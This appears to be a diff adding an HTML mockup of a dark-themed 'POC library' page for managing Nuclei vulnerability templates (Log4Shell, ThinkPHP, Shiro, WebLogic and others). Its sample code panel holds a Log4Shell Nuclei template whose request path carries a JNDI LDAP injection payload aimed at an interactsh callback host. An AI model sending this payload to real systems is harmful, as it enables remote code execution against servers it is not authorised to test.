@@ -1,0 +1,210 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>POC 库 · 方案 C4：暗色渗透台</title>
+<style>
+	:root {
+		--bg: #0d1117;
+		--panel: #161b22;
+		--panel-2: #1c2129;
+		--line: #21262d;
+		--line-soft: #1a1f26;
+		--text: #e6edf3;
+		--dim: #8b949e;
+		--faint: #6e7681;
+		--accent: #4493f8;
+		--accent-dim: #4493f81a;
+		--mono: "SF Mono", ui-monospace, Menlo, Consolas, monospace;
+	}
+	* { box-sizing: border-box; margin: 0; padding: 0; }
+	body {
+		background: var(--bg); color: var(--text);
+		font: 13px/1.6 -apple-system, "PingFang SC", "Microsoft YaHei", sans-serif;
+		padding: 20px 24px 60px;
+	}
+	.note { text-align: center; color: var(--dim); margin-bottom: 16px; }
+	.note b { color: var(--accent); }
+
+	/* ---- 头部：左标题右操作，一行搞定，下方一条渐隐分隔 ---- */
+	.head { display: flex; align-items: center; gap: 14px; margin-bottom: 4px; }
+	.head .logo {
+		width: 30px; height: 30px; border-radius: 8px; background: linear-gradient(135deg, #4493f8, #a371f7);
+		display: flex; align-items: center; justify-content: center; font-family: var(--mono);
+		font-size: 13px; font-weight: 700; color: #fff;
+	}
+	.head h1 { font-size: 16px; font-weight: 600; }
+	.head .sub { font-size: 12px; color: var(--dim); }
+	.head .ops { margin-left: auto; display: flex; gap: 8px; }
+	.btn {
+		height: 30px; padding: 0 13px; border-radius: 7px; font-size: 12.5px; cursor: pointer;
+		border: 1px solid var(--line); background: var(--panel-2); color: var(--text);
+	}
+	.btn:hover { border-color: #30363d; background: #22272e; }
+	.btn.primary { background: var(--accent); border-color: var(--accent); color: #fff; font-weight: 500; }
+	.btn.primary:hover { background: #5c9df8; }
+	.head-rule { height: 1px; background: linear-gradient(90deg, var(--line), transparent 70%); margin: 12px 0 14px; }
+
+	/* ---- 过滤：仿终端提示符的搜索行 ---- */
+	.filterline {
+		display: flex; align-items: center; gap: 10px; margin-bottom: 14px;
+		background: var(--panel); border: 1px solid var(--line); border-radius: 9px; padding: 8px 14px;
+	}
+	.filterline .ps { font-family: var(--mono); color: #3fb950; font-size: 13px; flex-shrink: 0; }
+	.filterline input {
+		flex: 1; background: transparent; border: none; outline: none; color: var(--text);
+		font-family: var(--mono); font-size: 12.5px;
+	}
+	.filterline input::placeholder { color: var(--faint); }
+	.filterline .cursor { width: 7px; height: 15px; background: #3fb950; animation: blink 1.1s steps(1) infinite; flex-shrink: 0; }
+	@keyframes blink { 50% { opacity: 0; } }
+	.fsev { display: flex; gap: 4px; border-left: 1px solid var(--line); padding-left: 10px; flex-shrink: 0; }
+	.fsev span {
+		font-size: 11.5px; padding: 2px 10px; border-radius: 999px; cursor: pointer; color: var(--dim);
+		border: 1px solid transparent; user-select: none;
+	}
+	.fsev span:hover { color: var(--text); border-color: var(--line); }
+	.fsev span.on { color: var(--accent); border-color: var(--accent); background: var(--accent-dim); }
+	.fsev span.c.on { color: #f85149; border-color: #f85149; background: #f851491a; }
+	.fsev span.h.on { color: #d29922; border-color: #d29922; background: #d299221a; }
+	.fsev span.m.on { color: #e3b341; border-color: #e3b341; background: #e3b3411a; }
+	.fsev span.l.on { color: #58a6ff; border-color: #58a6ff; background: #58a6ff1a; }
+	.fsev span.i.on { color: #3fb950; border-color: #3fb950; background: #3fb9501a; }
+
+	/* ---- 台账表：暗色，行 hover 提亮，等级为 mono 大写徽标 ---- */
+	table { width: 100%; border-collapse: separate; border-spacing: 0 3px; }
+	thead th {
+		text-align: left; font-size: 10.5px; font-weight: 550; color: var(--faint);
+		padding: 4px 14px; letter-spacing: .08em; text-transform: uppercase;
+	}
+	tbody tr.main {
+		background: var(--panel); cursor: pointer; transition: background .1s;
+	}
+	tbody tr.main td { padding: 8px 14px; border-top: 1px solid var(--line-soft); border-bottom: 1px solid var(--line-soft); }
+	tbody tr.main td:first-child { border-left: 1px solid var(--line-soft); border-radius: 8px 0 0 8px; }
+	tbody tr.main td:last-child { border-right: 1px solid var(--line-soft); border-radius: 0 8px 8px 0; }
+	tbody tr.main:hover { background: var(--panel-2); }
+	tbody tr.main.open { background: var(--panel-2); box-shadow: inset 2px 0 0 var(--accent); }
+	td.id { font-family: var(--mono); font-size: 12px; color: var(--accent); }
+	td.name { font-size: 12.5px; max-width: 360px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+	.sev {
+		font-family: var(--mono); font-size: 10px; letter-spacing: .1em; text-transform: uppercase;
+		padding: 2px 8px; border-radius: 4px; font-weight: 600;
+	}
+	.sev.critical { color: #f85149; background: #f851491f; } .sev.high { color: #d29922; background: #d299221f; }
+	.sev.medium { color: #e3b341; background: #e3b3411f; } .sev.low { color: #58a6ff; background: #58a6ff1f; }
+	.sev.info { color: #3fb950; background: #3fb9501f; }
+	td .tags { display: flex; gap: 4px; }
+	td .tags span { font-family: var(--mono); font-size: 10.5px; color: var(--dim); background: #00000066; border: 1px solid var(--line); padding: 0 6px; border-radius: 4px; }
+	td.cve { font-family: var(--mono); font-size: 11.5px; color: #d2a8ff; }
+	td.when { font-family: var(--mono); font-size: 11px; color: var(--faint); white-space: nowrap; }
+	td.op button { border: none; background: none; color: transparent; cursor: pointer; font-size: 12px; padding: 3px 7px; border-radius: 4px; }
+	tr.main:hover td.op button { color: var(--faint); }
+	td.op button:hover { color: #f85149; background: #f851491a; }
+	.caret { color: var(--faint); font-size: 9px; transition: transform .12s; display: inline-block; }
+	tr.main.open .caret { transform: rotate(90deg); color: var(--accent); }
+
+	/* ---- 展开：同为暗色，但加一条绿色基准线 + 行号，像打开的脚本 ---- */
+	tr.detail td { padding: 2px 14px 10px 40px; cursor: default; }
+	tr.detail .codebox {
+		background: #0a0e14; border: 1px solid var(--line); border-radius: 8px; overflow: hidden;
+	}
+	.code-meta {
+		display: flex; align-items: center; gap: 14px; padding: 6px 14px; font-family: var(--mono);
+		font-size: 11px; color: var(--dim); border-bottom: 1px solid var(--line-soft);
+	}
+	.code-meta .ops { margin-left: auto; display: flex; gap: 6px; }
+	.code-meta .ops button { background: var(--panel-2); border: 1px solid var(--line); color: var(--text); font-size: 11px; padding: 2px 10px; border-radius: 5px; cursor: pointer; }
+	.code-meta .ops button:hover { border-color: #30363d; }
+	.code-meta .ops button.danger { color: #f85149; }
+	.codebox pre {
+		margin: 0; padding: 12px 0; font-family: var(--mono); font-size: 11.5px; line-height: 1.75;
+		color: #c9d1d9; max-height: 280px; overflow: auto;
+		border-left: 2px solid #238636;
+	}
+	.codebox .ln { display: inline-block; width: 34px; text-align: right; padding-right: 12px; color: #30363d; user-select: none; }
+</style>
+</head>
+<body>
+<div class="note">C4 · <b>暗色渗透台</b> —— 整页暗色：终端提示符搜索行 + mono 徽标 + 带行号代码块。与浅色控制台反差最大，渗透气质最强。点击行展开。</div>
+
+<div class="head">
+	<span class="logo">P</span>
+	<h1>POC 库</h1>
+	<span class="sub">Nuclei 模板中心 · 128 个模板 · Agent 只读</span>
+	<span class="ops">
+		<button class="btn">导出清单</button>
+		<button class="btn primary">导入 yaml / zip</button>
+	</span>
+</div>
+<div class="head-rule"></div>
+
+<div class="filterline">
+	<span class="ps">poc&gt;</span>
+	<input placeholder="grep 模板 id / 名称 / 标签 / CVE …" />
+	<span class="cursor"></span>
+	<span class="fsev">
+		<span class="c">CRIT</span><span class="h">HIGH</span><span class="m">MED</span><span class="l">LOW</span><span class="i">INFO</span>
+	</span>
+</div>
+
+<table>
+	<thead>
+		<tr><th style="width:24px"></th><th>模板 ID</th><th>等级</th><th>名称</th><th>标签</th><th>CVE</th><th>导入</th><th></th></tr>
+	</thead>
+	<tbody id="rows"></tbody>
+</table>
+
+<script>
+	const data = [
+		{ id: "CVE-2021-44228-log4j-rce", sev: "critical", name: "Apache Log4j2 JNDI 远程代码执行（Log4Shell）", tags: ["cve", "rce"], cve: "CVE-2021-44228", when: "10-12 14:03", file: "log4shell.yaml" },
+		{ id: "thinkphp-5023-rce", sev: "critical", name: "ThinkPHP 5.0.23 invokefunction 远程代码执行", tags: ["rce", "thinkphp"], cve: "—", when: "10-12 14:03", file: "thinkphp.yaml" },
+		{ id: "shiro-deserialization", sev: "high", name: "Apache Shiro rememberMe 反序列化命令执行", tags: ["deserialization", "shiro"], cve: "—", when: "10-11 09:41", file: "shiro.yaml" },
+		{ id: "weblogic-iiop-t3-weak", sev: "high", name: "WebLogic IIOP/T3 反序列化（CVE-2020-2883）", tags: ["cve"], cve: "CVE-2020-2883", when: "10-11 09:41", file: "weblogic.yaml" },
+		{ id: "springboot-env-exposure", sev: "medium", name: "Spring Boot actuator env 端点信息泄露", tags: ["exposure", "springboot"], cve: "—", when: "10-10 18:22", file: "springboot.yaml" },
+		{ id: "git-config-exposure", sev: "low", name: "Git 配置文件泄露（/.git/config）", tags: ["exposure", "git"], cve: "—", when: "10-09 11:05", file: "git.yaml" },
+	];
+	const sevLabel = { critical: "CRIT", high: "HIGH", medium: "MED", low: "LOW", info: "INFO" };
+	const lines = [
+		'id: CVE-2021-44228-log4j-rce', '', 'info:', '  name: Apache Log4j2 JNDI RCE (Log4Shell)',
+		'  severity: critical', '  tags: cve,rce', '  classification:', '    cve-id: CVE-2021-44228',
+		'', 'http:', '  - method: GET', '    path:', '      - "{{BaseURL}}/?x=${jndi:ldap://{{interactsh-url}}/a}"',
+		'    matchers:', '      - type: word', '        part: interactsh_protocol', '        words:',
+		'          - "dns"', '          - "http"',
+	];
+	const numbered = lines.map((l, i) => `<span class="ln">${i + 1}</span>${l}`).join("\n");
+	const rows = document.getElementById("rows");
+	let openIndex = 0;
+	function render() {
+		rows.innerHTML = data.map((d, i) => {
+			const main = `<tr class="main ${i === openIndex ? "open" : ""}" onclick="toggle(${i})">
+				<td><span class="caret">▶</span></td>
+				<td class="id">${d.id}</td>
+				<td><span class="sev ${d.sev}">${sevLabel[d.sev]}</span></td>
+				<td class="name">${d.name}</td>
+				<td><span class="tags">${d.tags.map((t) => `<span>${t}</span>`).join("")}</span></td>
+				<td class="cve">${d.cve}</td>
+				<td class="when">${d.when}</td>
+				<td class="op"><button>✕</button></td>
+			</tr>`;
+			const detail = i === openIndex
+				? `<tr class="detail" onclick="event.stopPropagation()"><td colspan="8"><div class="codebox">
+						<div class="code-meta">
+							<span>${d.file}</span><span>导入 ${d.when}</span><span>${d.tags.join(" · ")}</span>
+							<span class="ops"><button>复制全文</button><button class="danger">删除模板</button></span>
+						</div>
+						<pre>${numbered}</pre>
+					</div></td></tr>`
+				: "";
+			return main + detail;
+		}).join("");
+	}
+	function toggle(i) { openIndex = openIndex === i ? -1 : i; render(); }
+	render();
+	document.querySelectorAll(".fsev span").forEach((el) =>
+		el.addEventListener("click", () => el.classList.toggle("on")),
+	);
+</script>
+</body>
+</html>
